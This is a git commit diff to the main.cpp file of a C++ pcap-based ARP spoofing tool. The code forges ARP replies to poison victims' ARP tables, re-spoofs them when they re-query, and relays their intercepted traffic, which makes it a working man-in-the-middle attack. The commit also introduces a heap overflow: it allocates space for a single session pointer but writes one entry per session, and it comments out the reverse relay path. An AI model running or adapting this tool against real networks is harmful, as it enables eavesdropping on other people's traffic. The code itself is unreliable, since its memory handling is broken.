8fdca31e29c4b34387848beba22c87d331c26332
LAMXkE <sametim17@gmail.com>
2019-08-18 13:17:57 +0900

    Improved relay algorithm

--- main.cpp
+++ main.cpp
@@ -15,7 +15,7 @@ int main(int argc, char **argv) {
     uint8_t myIP[4];
     uint8_t myMAC[6];
 
-    session *sessionlist;
+    session **sessionlist;
 
     uint8_t packet[1500];
     uint8_t relay_packet[9001];
@@ -36,10 +36,12 @@ int main(int argc, char **argv) {
         exit(1);
     }
 
-
+    sessionlist = reinterpret_cast<session **>( malloc(sizeof(session*)));
     sessioncnt = argc / 2 - 1;
+    for(int j = 0 ; j < sessioncnt; ++j){
+        sessionlist[j] = reinterpret_cast<session *>( malloc(sizeof(session)));
+    }
 
-    sessionlist = reinterpret_cast<session *>( malloc(sizeof(session) * sessioncnt));
     memset(packet, 0, sizeof(packet));      //initialize packet
 
 
@@ -49,13 +51,13 @@ int main(int argc, char **argv) {
     get_my_MAC(myMAC);
 
     for(int j = 0 ; j < sessioncnt ; j++){
-        getIP(argv[j*2+2], (sessionlist+j)->senderIP);
-        getIP(argv[j*2+3], (sessionlist+j)->targetIP);
+        getIP(argv[j*2+2], sessionlist[j]->senderIP);
+        getIP(argv[j*2+3], sessionlist[j]->targetIP);
 
 
 
 
-        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, (sessionlist+j)->targetIP);
+        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, sessionlist[j]->targetIP);
         sendPacket(fp,packet,sizeof(arp_packet));
 
 
@@ -65,15 +67,15 @@ int main(int argc, char **argv) {
             int res = pcap_next_ex(fp, &header, &recv_pack);
             if(res == 0)continue;
             if (res == -1 || res == -2) break;
-            if(checkARP(recv_pack, myIP, (sessionlist+j)->targetIP) == 2){
+            if(checkARP(recv_pack, myIP, sessionlist[j]->targetIP) == 2){
                 if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
-                    memcpy((sessionlist+j)->targetMAC, recv_pack+22,6);
+                    memcpy(sessionlist[j]->targetMAC, recv_pack+22,6);
                     break;
                 }
             }
         }
 
-        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, (sessionlist+j)->senderIP);
+        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, sessionlist[j]->senderIP);
         sendPacket(fp,packet,sizeof(arp_packet));
 
 
@@ -85,9 +87,9 @@ int main(int argc, char **argv) {
             if(res == 0)continue;
             if (res == -1 || res == -2) break;
 
-            if(checkARP(recv_pack, myIP, (sessionlist+j)->senderIP) == 2){
+            if(checkARP(recv_pack, myIP, sessionlist[j]->senderIP) == 2){
                 if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
-                    memcpy((sessionlist+j)->senderMAC, recv_pack+22,6);
+                    memcpy(sessionlist[j]->senderMAC, recv_pack+22,6);
                     break;
                 }
             }
@@ -107,13 +109,13 @@ int main(int argc, char **argv) {
         printf("session %d\n", k+1);
         printf("target MAC: ");
         for(int j = 0 ; j < 6 ; j++){
-            printf("%02x ",(sessionlist+k)->targetMAC[j]);
+            printf("%02x ",sessionlist[k]->targetMAC[j]);
         }
         printf("\n");
 
         printf("sender MAC: ");
         for(int j = 0 ; j < 6 ; j++){
-            printf("%02x ",(sessionlist+k)->senderMAC[j]);
+            printf("%02x ",sessionlist[k]->senderMAC[j]);
         }
         printf("\n");
     }
@@ -123,7 +125,7 @@ int main(int argc, char **argv) {
     printf("Spoofing Victim's arp table...\n");
     for(int j = 0 ; j < sessioncnt ; j++){
         //packet, DestMac, SourceMac, opcode, SenderMac, TargetMac, SenderIp, TargetIP
-        makeARPpacket(packet, (sessionlist+j)->targetMAC, myMAC, 2, myMAC, (sessionlist+j)->targetMAC, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP);
+        makeARPpacket(packet, sessionlist[j]->targetMAC, myMAC, 2, myMAC, sessionlist[j]->targetMAC, sessionlist[j]->senderIP, sessionlist[j]->targetIP);
         for(int k = 0 ; k < 5 ; k++){
             sleep(1);
             sendPacket(fp,packet,sizeof(arp_packet));
@@ -137,12 +139,12 @@ int main(int argc, char **argv) {
         int res = pcap_next_ex(fp, &header, &recv_pack);
         if(res == 0) continue;
         if (res == -1 || res == -2) break;
-        for(int j = 0 ; j < sessioncnt ; j++){
-            switch(checkARP(recv_pack, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP)){
+        for(int j = 0 ; j < sessioncnt ; ++j){
+            switch(checkARP(recv_pack, sessionlist[j]->senderIP, sessionlist[j]->targetIP)){
                 case 2:
                     printf("ReSpoofing session %d...\n", j+1);
                     if( arppackidx != j){
-                        makeARPpacket(packet, (sessionlist+j)->targetMAC, myMAC, 2, myMAC, (sessionlist+j)->targetMAC, (sessionlist+j)->senderIP, (sessionlist+j)->targetIP);
+                        makeARPpacket(packet, sessionlist[j]->targetMAC, myMAC, 2, myMAC, sessionlist[j]->targetMAC, sessionlist[j]->senderIP, sessionlist[j]->targetIP);
                     }
                     sendPacket(fp,packet,sizeof(arp_packet));
                     arppackidx = j;
@@ -151,25 +153,33 @@ int main(int argc, char **argv) {
                     continue;
                 case 0:
                     if(checkDestMAC(recv_pack,myMAC)){
-                        if(checkSourceMac(recv_pack, (sessionlist+j)->targetMAC)){
-                            memcpy(relay_packet, recv_pack, header->caplen);
-                            spoofHeader(relay_packet, (sessionlist+j)->senderMAC, myMAC);
-                            sendPacket(fp,relay_packet, header->caplen);
+                        for(;j<sessioncnt;++j){
+                            if(checkSourceMac(recv_pack, sessionlist[j]->targetMAC)){
+                                memcpy(relay_packet, recv_pack, header->caplen);
+                                spoofHeader(relay_packet, sessionlist[j]->senderMAC, myMAC);
+                                sendPacket(fp,relay_packet, header->caplen);
+                                break;
+                            //}
+                            //else if(checkSourceMac(recv_pack, sessionlist[j]->senderMAC)){
+                            //    memcpy(relay_packet, recv_pack, header->caplen);
+                            //    spoofHeader(relay_packet, sessionlist[j]->targetMAC, myMAC);
+                            //    sendPacket(fp,relay_packet, header->caplen);
+                            //    break;
+                            }else{
+                                continue;
+                            }
                         }
-                        else if(checkSourceMac(recv_pack, (sessionlist+j)->senderMAC)){
-                            memcpy(relay_packet, recv_pack, header->caplen);
-                            spoofHeader(relay_packet, (sessionlist+j)->targetMAC, myMAC);
-                            sendPacket(fp,relay_packet, header->caplen);
-                        }
-
-                    }
                     break;
-            }
+                    }
 
+            }
         }
 
 
 
+    }
+    for(int j = 0 ; j < sessioncnt ; ++j){
+        free(sessionlist[j]);
     }
     free(sessionlist);
     printf("Done");
